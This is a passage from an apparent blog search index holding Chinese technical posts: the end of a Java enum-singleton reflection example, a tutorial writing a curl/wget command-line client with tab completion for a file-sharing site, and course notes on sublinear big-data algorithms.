class=\"string\">&quot;acquireConstructorAccessor&quot;</span>);</span><br><span class=\"line\">acquireConstructorAccessor.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">acquireConstructorAccessor.invoke(c);</span><br><span class=\"line\">Field field = Constructor.class.getDeclaredField(<span class=\"string\">&quot;constructorAccessor&quot;</span>);</span><br><span class=\"line\">field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">ConstructorAccessor constructorAccessor = (ConstructorAccessor) field.get(c);</span><br><span class=\"line\">Singleton instance2 = (Singleton) constructorAccessor.newInstance(<span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;INSTANCE&quot;</span>, <span class=\"number\">0</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(instance2 == instance1);</span><br></pre></td></tr></table></figure><br>而在JDK9+中修复了这一问题，JDK9+对类的访问权限设置了更安全的控制。</p>\n<h2 id=\"相关链接\"><a href=\"#相关链接\" class=\"headerlink\" title=\"相关链接\"></a>相关链接</h2><p><a href=\"https://www.hollischuang.com/archives/2498\">为什么我墙裂建议大家使用枚举来实现单例</a></p>\n","tags":["Java","设计模式"]},{"title":"命令行下的share","url":"/2020/02/21/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84share/","content":"<p>同学写了个上传文件的网站：<a href=\"https://share.whoisnian.com\">share</a> 用于解决linux下QQ传文件的问题。我突发奇想，做一命令行下的share客户端。完整代码见<a href=\"https://github.com/xuranus/share-terminal\">share-terminal</a></p>\n<p>需要用到:</p>\n<ul>\n<li>zsh</li>\n<li>xmllint</li>\n<li>curl</li>\n<li>wget</li>\n</ul>\n<p>首先网站地址是：<code>https://share.whoisnian.com</code>，准备从服务器上拉取文件列表，存在本地<code>/tmp/share.list</code>，下载的时候可以快速补全文件名，创建一个名为share的bash脚本：<br><span id=\"more\"></span></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">url=<span class=\"string\">&quot;https://share.whoisnian.com&quot;</span></span><br><span class=\"line\">localList=<span class=\"string\">&quot;/tmp/share.list&quot;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"同步列表\"><a href=\"#同步列表\" class=\"headerlink\" title=\"同步列表\"></a>同步列表</h3><p>首先编写第一个功能，同步远端文件列表到本地：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">_shareSync</span></span>() &#123;</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;local file list synchronizing.....&quot;</span></span><br><span class=\"line\">  (curl <span class=\"variable\">$url</span> | \\</span><br><span class=\"line\">    xmllint --html --xpath \\</span><br><span class=\"line\">    <span class=\"string\">&#x27;//a[@class=&quot;maxlen&quot;]/text()&#x27;</span> \\</span><br><span class=\"line\">    --noout  2&gt;/dev/null - \\</span><br><span class=\"line\">  ) &gt; <span class=\"variable\">$localList</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Done.&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>这里先用<code>curl</code>获得html代码，然后用管道传输给<code>xmllint</code>，用<code>--xpath</code>解析出<code>class</code>是”maxlen”的链接标签的文本，也就是文件名。用<code>--noout 2&gt;/dev/null</code>取消报错输出，把最终结果也就是文件列表，存入<code>/tmp/share.list</code><br>这个临时文件内容是这样：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat /tmp/share.list </span><br><span class=\"line\">Screenshot_2020-02-05-20-28-47.jpg</span><br><span class=\"line\">beijing_all_20200101.csv</span><br><span class=\"line\">统计学习方法.pdf</span><br><span class=\"line\">trpl-zh-cn.pdf</span><br><span class=\"line\">Wallpaper.jpg</span><br><span class=\"line\">Proxy-SwitchyOmega-Chromium-2.5.15.crx</span><br><span class=\"line\">Shadowsocks-Qt5-3.0.1-x86_64.AppImage</span><br><span class=\"line\">macOSPublicBetaAccessUtility.dmg</span><br><span class=\"line\">jmeter.png</span><br><span class=\"line\">深入浅出React和Redux (实战).pdf</span><br><span class=\"line\">IdeaProjects.rar</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h3><p>下载文件就是按照”<a href=\"https://share.whoisnian.com/upload/&quot;+文件名的链接，直接用`wget`下载\">https://share.whoisnian.com/upload/&quot;+文件名的链接，直接用`wget`下载</a><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">_shareDownload</span></span>() &#123;</span><br><span class=\"line\">  href=<span class=\"variable\">$url</span><span class=\"string\">&quot;/upload/&quot;</span><span class=\"variable\">$1</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;href: &quot;</span><span class=\"variable\">$href</span></span><br><span class=\"line\">  wget <span class=\"variable\">$href</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h3><p>删除文件需要传入POST参数”submit=delete”和”name=文件名”，用<code>curl</code>模拟POST<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">_shareDelete</span></span>() &#123;</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;delete: &quot;</span><span class=\"variable\">$1</span></span><br><span class=\"line\">  curl -s <span class=\"variable\">$url</span><span class=\"string\">&quot;/index.php&quot;</span> \\</span><br><span class=\"line\">    -X POST \\</span><br><span class=\"line\">    -d <span class=\"string\">&quot;name=&quot;</span><span class=\"variable\">$1</span><span class=\"string\">&quot;&amp;submit=delete&quot;</span> \\</span><br><span class=\"line\">    &gt; /dev/null</span><br><span class=\"line\">  _shareSync</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"上传\"><a href=\"#上传\" class=\"headerlink\" title=\"上传\"></a>上传</h3><p>上传文件，需要传入文件和”submit=upload”参数<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">_shareUpload</span></span>() &#123;</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;upload: &quot;</span><span class=\"variable\">$1</span></span><br><span class=\"line\">  curl \\</span><br><span class=\"line\">    -F <span class=\"string\">&quot;file[]=@&quot;</span><span class=\"variable\">$1</span> \\</span><br><span class=\"line\">    -F <span class=\"string\">&quot;submit=upload&quot;</span> \\</span><br><span class=\"line\">    <span class=\"variable\">$url</span><span class=\"string\">&quot;/index.php&quot;</span> &gt; /dev/null</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"命令行参数\"><a href=\"#命令行参数\" class=\"headerlink\" title=\"命令行参数\"></a>命令行参数</h3><p>最后写做一下提示功能和命令行参数识别：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">help</span></span>() &#123;</span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: share [option] &lt;filename&gt;&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Options:&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;  sync: update local file list from server&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;    ls: show files from local list&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;     d: download file&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;     u: upload local file&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;   del: delete file from server&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Example:&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;  share d myfile.txt&quot;</span>  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [[ <span class=\"variable\">$1</span> == <span class=\"string\">&quot;sync&quot;</span> ]]; <span class=\"keyword\">then</span> <span class=\"comment\">#synchronize list</span></span><br><span class=\"line\">  _shareSync</span><br><span class=\"line\"><span class=\"keyword\">elif</span> [[ <span class=\"variable\">$1</span> == <span class=\"string\">&quot;ls&quot;</span> ]]; <span class=\"keyword\">then</span> <span class=\"comment\">#local lost</span></span><br><span class=\"line\">  _shareList</span><br><span class=\"line\"><span class=\"keyword\">elif</span> [[ <span class=\"variable\">$1</span> == <span class=\"string\">&quot;d&quot;</span> ]]; <span class=\"keyword\">then</span> <span class=\"comment\">#download</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [[ <span class=\"variable\">$2</span> == <span class=\"string\">&quot;&quot;</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;filename required&quot;</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    _shareDownload <span class=\"variable\">$2</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">elif</span> [[ <span class=\"variable\">$1</span> == <span class=\"string\">&quot;u&quot;</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  _shareUpload <span class=\"variable\">$2</span></span><br><span class=\"line\"><span class=\"keyword\">elif</span> [[ <span class=\"variable\">$1</span> == <span class=\"string\">&quot;del&quot;</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [[ <span class=\"variable\">$2</span> == <span class=\"string\">&quot;&quot;</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;filename required&quot;</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    _shareDelete <span class=\"variable\">$2</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">elif</span> [[ <span class=\"variable\">$1</span> == <span class=\"string\">&quot;help&quot;</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">help</span></span><br><span class=\"line\"><span class=\"keyword\">elif</span> [[ <span class=\"variable\">$1</span> == <span class=\"string\">&quot;&quot;</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">help</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;unknown option: &quot;</span><span class=\"variable\">$1</span><span class=\"string\">&quot; sh ,see usage:\\&quot;share help\\&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"自动补全\"><a href=\"#自动补全\" class=\"headerlink\" title=\"自动补全\"></a>自动补全</h3><p>如果就做到上述的，已经能用了，但是需要手动输入文件名，很麻烦，习惯摁Tab的我当然要实现自动补全。</p>\n<p>自动补全需要在shell中配置<code>complete</code>，创建一个<code>bash.rc</code>用于存放自动补全的配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">_share</span></span>() &#123;</span><br><span class=\"line\">    COMPREPLY=()</span><br><span class=\"line\">    <span class=\"built_in\">local</span> cur=<span class=\"variable\">$&#123;COMP_WORDS[COMP_CWORD]&#125;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">local</span> com=<span class=\"variable\">$&#123;COMP_WORDS[COMP_CWORD-1]&#125;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"variable\">$com</span> <span class=\"keyword\">in</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;share&#x27;</span>) <span class=\"comment\">#如果遇到share命令</span></span><br><span class=\"line\">        COMPREPLY=($(compgen -W <span class=\"string\">&#x27;ls d u help del&#x27;</span> -- <span class=\"variable\">$cur</span>)) <span class=\"comment\">#候选的补全为ls d u help del</span></span><br><span class=\"line\">        ;;</span><br><span class=\"line\">    <span class=\"string\">&#x27;d&#x27;</span>) <span class=\"comment\">#如果第二个参数是d</span></span><br><span class=\"line\">        <span class=\"built_in\">local</span> pro=($(awk <span class=\"string\">&#x27;&#123;print $1&#125;&#x27;</span> /tmp/share.list)) <span class=\"comment\">#读取临时文件中的文件名，存为数组</span></span><br><span class=\"line\">        COMPREPLY=($(compgen -W <span class=\"string\">&quot;<span class=\"variable\">$&#123;pro[*]&#125;</span>&quot;</span> -- <span class=\"variable\">$cur</span>)) <span class=\"comment\">#zsh 从数组中设置候选补全的文件名</span></span><br><span class=\"line\">        <span class=\"comment\">#COMPREPLY=($(compgen -W &#x27;$&#123;pro[@]&#125;&#x27; -- $cur)) #bash</span></span><br><span class=\"line\">        ;;</span><br><span class=\"line\">    *)</span><br><span class=\"line\">        ;;</span><br><span class=\"line\">    <span class=\"keyword\">esac</span></span><br><span class=\"line\">    <span class=\"built_in\">return</span> 0</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">complete -F _share share </span><br></pre></td></tr></table></figure>\n<p>在<code>~/.zshrc</code>中把share加入环境变量$PATH，并<code>source bash.rc</code>就可以了，效果如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">╭─xuranus@Thanos ~ </span><br><span class=\"line\">╰─$ share d</span><br><span class=\"line\">beijing_all_20200101.csv                macOSPublicBetaAccessUtility.dmg        Shadowsocks-Qt5-3.0.1-x86_64.AppImage   深入浅出React和Redux                                                          </span><br><span class=\"line\">IdeaProjects.rar                        Proxy-SwitchyOmega-Chromium-2.5.15.crx  trpl-zh-cn.pdf                          统计学习方法.pdf                                                              </span><br><span class=\"line\">jmeter.png                              Screenshot_2020-02-05-20-28-47.jpg      Wallpaper.jpg    </span><br></pre></td></tr></table></figure><br>输入<code>share</code>后按Tab可以补全option，如果option是<code>d</code>，则按Tab补全文件名。</p>\n<p>需要注意的是：bash和zsh的语法略有差异，根据你的环境需要区别对开。zsh下如果出现<code>command not found:complete</code>,需要在<code>~/.zshrc</code>头加入：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">autoload</span> bashcompinit</span><br><span class=\"line\">bashcompinit</span><br></pre></td></tr></table></figure></p>\n<p>最后试试使用效果：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">╭─xuranus@Thanos ~ </span><br><span class=\"line\">╰─$ share sync                                                                                                                                                                                              130 ↵</span><br><span class=\"line\">local file list synchronizing.....</span><br><span class=\"line\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">100 10098    0 10098    0     0   1315      0 --:--:--  0:00:07 --:--:--  2237</span><br><span class=\"line\">Done.</span><br><span class=\"line\"></span><br><span class=\"line\">╭─xuranus@Thanos ~ </span><br><span class=\"line\">╰─$ share ls</span><br><span class=\"line\">Screenshot_2020-02-05-20-28-47.jpg</span><br><span class=\"line\">beijing_all_20200101.csv</span><br><span class=\"line\">统计学习方法.pdf</span><br><span class=\"line\">trpl-zh-cn.pdf</span><br><span class=\"line\">Wallpaper.jpg</span><br><span class=\"line\">Proxy-SwitchyOmega-Chromium-2.5.15.crx</span><br><span class=\"line\">Shadowsocks-Qt5-3.0.1-x86_64.AppImage</span><br><span class=\"line\">macOSPublicBetaAccessUtility.dmg</span><br><span class=\"line\">jmeter.png</span><br><span class=\"line\">IdeaProjects.rar</span><br><span class=\"line\"></span><br><span class=\"line\">╭─xuranus@Thanos ~ </span><br><span class=\"line\">╰─$ share d 统计学习方法.pdf </span><br><span class=\"line\">href: https://share.whoisnian.com/upload/统计学习方法.pdf</span><br><span class=\"line\">--2020-02-21 10:46:59--  https://share.whoisnian.com/upload/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95.pdf</span><br><span class=\"line\">Loaded CA certificate &#x27;/etc/ssl/certs/ca-certificates.crt&#x27;</span><br><span class=\"line\">Resolving share.whoisnian.com (share.whoisnian.com)... 45.77.145.72, 2001:19f0:5:6c2a:5400:2ff:fe1b:7404</span><br><span class=\"line\">Connecting to share.whoisnian.com (share.whoisnian.com)|45.77.145.72|:443... connected.</span><br><span class=\"line\">HTTP request sent, awaiting response... 200 OK</span><br><span class=\"line\">Length: 18415263 (18M) [application/pdf]</span><br><span class=\"line\">Saving to: ‘统计学习方法.pdf’</span><br><span class=\"line\"></span><br><span class=\"line\">统计学习方法.pdf                                     100%[====================================================================================================================&gt;]  17.56M   819KB/s    in 49s     </span><br><span class=\"line\"></span><br><span class=\"line\">2020-02-21 10:47:52 (369 KB/s) - ‘统计学习方法.pdf’ saved [18415263/18415263]</span><br><span class=\"line\"></span><br><span class=\"line\">╭─xuranus@Thanos ~/Downloads </span><br><span class=\"line\">╰─$ share u shiyan.json  </span><br><span class=\"line\">upload: shiyan.json</span><br><span class=\"line\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">100 25313    0 10797  100 14516   3591   4829  0:00:03  0:00:03 --:--:--  8420</span><br><span class=\"line\"></span><br><span class=\"line\">╭─xuranus@Thanos ~ </span><br><span class=\"line\">╰─$ share del shiyan.json</span><br><span class=\"line\">delete: shiyan.json</span><br><span class=\"line\">local file list synchronizing.....</span><br><span class=\"line\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">100 10098    0 10098    0     0  11108      0 --:--:-- --:--:-- --:--:-- 11096</span><br><span class=\"line\">Done.</span><br></pre></td></tr></table></figure></p>\n","tags":["Linux"]},{"title":"大数据算法（1）亚线性算法","url":"/2021/03/17/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AE%97%E6%B3%95%EF%BC%881%EF%BC%89%E4%BA%9A%E7%BA%BF%E6%80%A7%E7%AE%97%E6%B3%95/","content":"<blockquote>\n<p>本文为icourse哈工大课程<a href=\"https://www.icourse163.org/learn/HIT-10001\">《大数据算法》</a>笔记</p>\n</blockquote>\n<h1 id=\"大数据算法概述\"><a href=\"#大数据算法概述\" class=\"headerlink\" title=\"大数据算法概述\"></a>大数据算法概述</h1><h2 id=\"大数据4个V\"><a href=\"#大数据4个V\" class=\"headerlink\" title=\"大数据4个V\"></a>大数据4个V</h2><ul>\n<li>Volume：数据规模大</li>\n<li>Variet：数据类型多，多源异构</li>\n<li>Velocity：处理速度快</li>\n<li>Value：基于深度分析的新价值</li>\n</ul>\n<h2 id=\"大数据上问题求解计算问题的过程\"><a href=\"#大数据上问题求解计算问题的过程\" class=\"headerlink\" title=\"大数据上问题求解计算问题的过程\"></a>大数据上问题求解计算问题的过程</h2><ol>\n<li>先判断是否可以计算。一个普通数据量上都不能计算的问题，在大数据上，也不可计算</li>\n<li>判断在现有的<strong>资源约束</strong>下，<strong>时间约束</strong>下，<strong>数据量</strong>下，是否是<strong>能行可计算</strong></li>\n<li>算法分析与设计</li>\n<li>编程实现算法(Hadoop/Spark)</li>\n<li>软件系统构造</li>\n</ol>\n<span id=\"more\"></span>\n<h2 id=\"大数据算法定义\"><a href=\"#大数据算法定义\" class=\"headerlink\" title=\"大数据算法定义\"></a>大数据算法定义</h2><p>在给定的<strong>资源约束</strong>下，以大数据为输入，在给定<strong>时间约束</strong>内可以生成满足给定<strong>约束结果</strong>的计算。</p>\n<p>大数据算法<strong>可以不是</strong></p>\n<ul>\n<li>精确算法：很多情况下，在有限资源下，可以选择舍弃精度换时间</li>\n<li>内存算法：难以在内存中存储全部数据，有时候考虑外存和多级存储器</li>\n<li>串行算法：大数据可以考虑在多台机器上执行</li>\n<li>仅在电子计算机上运行的算法：可以有人来参与到程序的执行</li>\n</ul>\n<p>大数据<strong>不仅是</strong>：</p>\n<ul>\n<li>云计算：大数据还可以在一些计算能力弱的平台上进行（如手机）</li>\n<li>MapReduce：除了并行模型，还有很多其他大数据的编程模型，如设计亚线性算法，或者引入人的参与</li>\n<li>大数据分析与挖掘的算法：一些基础问题，例如排序于查找，在大数据环境下都需要重新设计</li>\n</ul>\n<p>大数据中的两个特点Volume和Velocity决定了大数据算法的设计。我们希望扫描数据$O(n)$或者$O(logn)$时间来解决问题。</p>\n<h2 id=\"大数据算法设计难度\"><a href=\"#大数据算法设计难度\" class=\"headerlink\" title=\"大数据算法设计难度\"></a>大数据算法设计难度</h2><ul>\n<li>访问全部数据时间太长<ul>\n<li>读取部分数据（时间亚线性算法）</li>\n</ul>\n</li>\n<li>数据难以放入内存计算<ul>\n<li>将数据存储到磁盘（外存算法）</li>\n<li>仅基于少量数据进行计算（空间亚线性算法）</li>\n</ul>\n</li>\n<li>单个计算机难以保存全部数据，计算需要整体数据<ul>\n<li>并行处理（并行算法）</li>\n</ul>\n</li>\n<li>计算机计算能力或者知识不足<ul>\n<li>人来参与（众包算法）</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"大数据算法设计技术\"><a href=\"#大数据算法设计技术\" class=\"headerlink\" title=\"大数据算法设计技术\"></a>大数据算法设计技术</h2><ul>\n<li>精确算法：大数据在精确计算上的应用</li>\n<li>并行算法</li>\n<li>近似算法：牺牲一部分精确性，在多项式时间内，给出精确性，并控制误差</li>\n<li>随机算法：利用随机化的方法，进行抽样</li>\n<li>在线算法/数据流算法：当数据源源不断时，在有限时间和空间内得到结果</li>\n<li>外存算法：当数据无法存储在内存时</li>\n<li>面向新型体系结构的算法：GPU大规模并行</li>\n<li>现代优化算法：蚁群算法，模拟退火，进化算法</li>\n</ul>\n<h2 id=\"大数据算法分析\"><a href=\"#大数据算法分析\" class=\"headerlink\" title=\"大数据算法分析\"></a>大数据算法分析</h2><ul>\n<li>时间空间复杂性分析：和传统算法分析一致</li>\n<li>IO复杂性分析：大数据算法区别于传统内存算法，IO会直接影响算法性能</li>\n<li>结果质量分析：（在得不到精确解时，要分析近似比；对于数据流算法，分析competitive radio，即知道整个数据集和只知道当前情况下，算法结果的区别）</li>\n<li>通讯复杂性：区别于传统单机结构，大数据的多机并行执行涉及到通讯复杂性问题</li>\n</ul>\n<h1 id=\"亚线性算法\"><a href=\"#亚线性算法\" class=\"headerlink\" title=\"亚线性算法\"></a>亚线性算法</h1><p>时间/空间/能量/通讯/IO消耗是：$o(输入规模)$</p>\n<ol>\n<li><p>亚线性时间算法</p>\n<ul>\n<li>亚线性时间近似算法</li>\n<li>例：给一个社交网络，在不访问所有节点的情况下，求平均每个节点的度</li>\n<li>性质检测算法</li>\n</ul>\n</li>\n<li><p>亚线性空间算法</p>\n<ul>\n<li>面向源源不断的数据流</li>\n<li>例：对一个几乎无限长的序列，不保存所有数字情况下，求中位数</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"水库抽样（空间亚线性算法）\"><a href=\"#水库抽样（空间亚线性算法）\" class=\"headerlink\" title=\"水库抽样（空间亚线性算法）\"></a>水库抽样（空间亚线性算法）</h2><p>输入：一组数据，大小未知<br>输出：这组数据的$k$个均匀抽样<br>要求：</p>\n<ol>\n<li>仅扫描一次数据</li>\n<li>空间复杂度$O(k)$，即：不能保存所有数据</li>\n<li>扫描到数据前$n$个数字时候$(n&gt;k)$，保存当前已扫描数据的$k$个均匀抽样</li>\n</ol>\n<p>算法：</p>\n<ol>\n<li>申请一个长度为$k$的数组$A$保存抽样</li>\n<li>保存首先接收到的$k$个元素</li>\n<li>当接收到第$i$个新元素的$t$时，以$k/i$的概率随机替换$A$中的元素(即：生成$[1,i]$间的随机数$j$,若$j \\leq k$,则以$t$替换$A[j]$)</li>\n</ol>\n<p>性质</p>\n<ol>\n<li><p>该采样是均匀的<br>第$i$个数被第一次选中的概率是$\\frac{k}{i}$，之后第$i+1$次中，第$i$个数依旧不会替换的概率是$(1- \\frac{1}{i+1})$。依此类推，第$i$个数在第$n$个数到来后，依旧被保留在抽样中的概率是：</p>\n<script type=\"math/tex; mode=display\">\n\\frac{k}{i} \\times (1- \\frac{1}{i+1}) \\times (1-\\frac{1}{i+2}) \\times \\dots \\times (1-\\frac{1}{n}) = \\frac{k}{n}</script><p>它和$i$是无关的，即每个数字无论到来的次序，被保留的概率均等，所以采样是均匀的。</p>\n</li>\n<li><p>空间复杂度$O(k)$</p>\n</li>\n</ol>\n<h2 id=\"平面图直径计算（时间亚线性算法）\"><a href=\"#平面图直径计算（时间亚线性算法）\" class=\"headerlink\" title=\"平面图直径计算（时间亚线性算法）\"></a>平面图直径计算（时间亚线性算法）</h2><p>输入：$m$个顶点的平面图，任意两点之间的距离存储在矩阵$D$中，即点到点的距离是$D_{ij}$</p>\n<ul>\n<li>输入大小是:<script type=\"math/tex; mode=display\">n=m^2</script></li>\n<li>最大的$D_{ij}$是图的直径</li>\n<li>点之间的距离对称且满足三角不等式</li>\n</ul>\n<p>输出：图的直径和距离最大的$D_{ij}$<br>要求：运行时间为$o(n)$，不能遍历所有数据  </p>\n<p>无法在要求的时间内得到精确解，寻找近似算法</p>\n<p>近似算法：</p>\n<ol>\n<li>任意选择$k \\leq m$</li>\n<li>选择使得$D_{kl}$最大的$l$</li>\n<li>输出$D_{kl}$和$(k,l)$</li>\n</ol>\n<p>该算法只访问了矩阵一行数据，显然不能精确计算结果，但是我们可以分析他的误差范围，假设$D_{ij}$是最优解，根据三角不等式：</p>\n<script type=\"math/tex; mode=display\">\nD_{ij} \\leq D_{ik} + D_{kj}</script><p>又因为$D_{kl}$在矩阵$k$行/列中最大，所以</p>\n<script type=\"math/tex; mode=display\">\nD_{ij} \\leq D_{ik} + D_{kj} \\leq D_{kl} + D_{kl} = 2D_{kl}</script><p>即</p>\n<script type=\"math/tex; mode=display\">\nD_{ij} \\leq 2D_{kl}</script><p>因此<strong>近似比2</strong></p>\n<p>运行时间</p>\n<script type=\"math/tex; mode=display\">O(m)=O(\\sqrt{n})=o(n)</script><h3 id=\"近似算法\"><a href=\"#近似算法\" class=\"headerlink\" title=\"近似算法\"></a>近似算法</h3><ul>\n<li>什么是近似算法<ul>\n<li>近似算法是用来解决优化问题</li>\n<li>能够给出优化问题的一个<strong>近似优化</strong>解的算法</li>\n</ul>\n</li>\n<li>近似算法解的近似度<ul>\n<li>问题每一个可能的解都具有一个代价</li>\n<li>问题的优化解决可能具有最大或者最小代价</li>\n<li>我们希望寻找问题的一个误差最小的近似优化解</li>\n</ul>\n</li>\n<li>我们需要分析近似解代价和优化解代价的差距<ul>\n<li>Ratio Bound（近似比）</li>\n<li>相对误差</li>\n<li>$(1+\\epsilon)$-近似</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"Ratio-Bound\"><a href=\"#Ratio-Bound\" class=\"headerlink\" title=\"Ratio Bound\"></a>Ratio Bound</h4><p>设A是一个优化问题的近似算法，A具有Ratio Bound $p(n)$，如果</p>\n<script type=\"math/tex; mode=display\">\nmax \\lbrace \\frac{C}{C^*},\\frac{C^*}{C} \\rbrace \\leq P(n)</script><p>其中$n$是输入大小，$C$是A产生的近似解的代价，$C^{\\ast}$是最优化解的代价。取$max$是为了应对最大化和最小化问题，使得结果$Ratio \\text{总是} \\geq 1$，$Ratio$越小越好。</p>\n<ul>\n<li>最大化问题中，往往$C \\leq C^{\\ast}$，所以取$Ratio=\\frac{C^{\\ast}}{C}$</li>\n<li>最小化问题中，往往$C \\geq C^{\\ast}$，所以取$Ratio=\\frac{C}{C^{\\ast}}$</li>\n</ul>\n<h4 id=\"相对误差\"><a href=\"#相对误差\" class=\"headerlink\" title=\"相对误差\"></a>相对误差</h4><p>近似算法的<strong>相对误差</strong>定义为：</p>\n<script type=\"math/tex; mode=display\">\n\\frac{\\vert C - C^{\\ast} \\vert}{C^{\\ast}}</script><p><strong>相对误差界</strong>定义为：</p>\n<script type=\"math/tex; mode=display\">\n\\frac{\\vert C - C^{\\ast} \\vert}{C^{\\ast}} \\leq \\epsilon(n)</script><h2 id=\"全0数组判定（时间亚线性判定算法）\"><a href=\"#全0数组判定（时间亚线性判定算法）\" class=\"headerlink\" title=\"全0数组判定（时间亚线性判定算法）\"></a>全0数组判定（时间亚线性判定算法）</h2><p>输入：包含$n$个元素的0，1数组$A$<br>输出：$A$中的元素是否全是0<br>要求：运行时间为$o(n)$</p>\n<h3 id=\"判定问题的近似求解\"><a href=\"#判定问题的近似求解\" class=\"headerlink\" title=\"判定问题的近似求解\"></a>判定问题的近似求解</h3><ul>\n<li>输入<strong>满足</strong>某种性质或者<strong>远非满足</strong>此性质</li>\n</ul>\n<p>判定问题的近似解的定义：输入满足某种性质或者远非满足此性质</p>\n<h3 id=\"epsilon-远离\"><a href=\"#epsilon-远离\" class=\"headerlink\" title=\"$\\epsilon$-远离\"></a>$\\epsilon$-远离</h3><p>对于输入串$x$，如果从$x$到串的集合$L$中任意字符串的汉明距离至少为$\\epsilon \\vert x \\vert$,则$x$是$\\epsilon$-远离$L$的</p>\n<blockquote>\n<p>在信息理论中，Hamming Distance 表示两个<strong>等长</strong>字符串在对应位置上不同字符的数目</p>\n</blockquote>\n<h3 id=\"算法描述\"><a 